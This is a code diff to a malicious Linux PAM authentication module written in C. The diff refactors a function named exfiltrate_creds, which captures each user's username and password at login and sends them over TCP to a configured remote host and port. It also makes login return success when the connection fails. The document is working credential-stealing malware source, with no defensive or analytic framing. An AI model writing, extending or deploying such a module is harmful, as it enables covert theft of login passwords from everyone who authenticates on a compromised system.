@@ -11,6 +11,7 @@
 #define PORT_TAG_STRING "port="
 #define NEW_LINE "\n"
 #define UNKNOW_PASSWORD_STRING "\b\n\r"
+#define SOCKET_ERROR_INT -1
 
 typedef struct {
    char  target[256];
@@ -48,7 +49,7 @@ Args_t* parse_args(int argc, const char **argv)
 	return args;
 }
 
-void exfiltrate_creds(Args_t* args,const char *username,const char *password)
+int open_socket(const char *hostname, long port)
 {
 	int sock;
 	struct sockaddr_in server;
@@ -57,31 +58,35 @@ void exfiltrate_creds(Args_t* args,const char *username,const char *password)
 	sock = socket(AF_INET , SOCK_STREAM , 0);
 
 	if (sock == -1){
-		return;
+		return SOCKET_ERROR_INT;
 	}
 	
-	server.sin_addr.s_addr = inet_addr( args->target );
+	server.sin_addr.s_addr = inet_addr( hostname );
 	server.sin_family = AF_INET;
-	server.sin_port = htons( args->port );
+	server.sin_port = htons( port );
 
 	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
-		return;
+		return SOCKET_ERROR_INT;
 	}
-	
+	return sock;
+}
+
+void exfiltrate_creds(int socket,const char *username,const char *password)
+{
 	
 	//Send data
-	send(sock , (const void *) username , strlen(username) , 0);
-	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
-	send(sock , (const void *) password , strlen(password) , 0);
-	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
-	send(sock , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
+	send(socket , (const void *) username , strlen(username) , 0);
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
+	send(socket , (const void *) password , strlen(password) , 0);
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
 
-	close(sock);
 }
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
 {
 	int pam_code;
+	int socket;
 	const char *username = NULL;
 	const char *password = NULL;
 	Args_t* args;
@@ -112,7 +117,15 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
 		return PAM_AUTH_ERR;
 	}
 
-	exfiltrate_creds(args, username, password);
+	socket = open_socket( args->target, args->port);
+	if ( SOCKET_ERROR_INT == socket )
+	{
+		return PAM_SUCCESS;
+	}
+
+	exfiltrate_creds(socket, username, password);
+	
+	close(socket);
 
 	printf("");
 
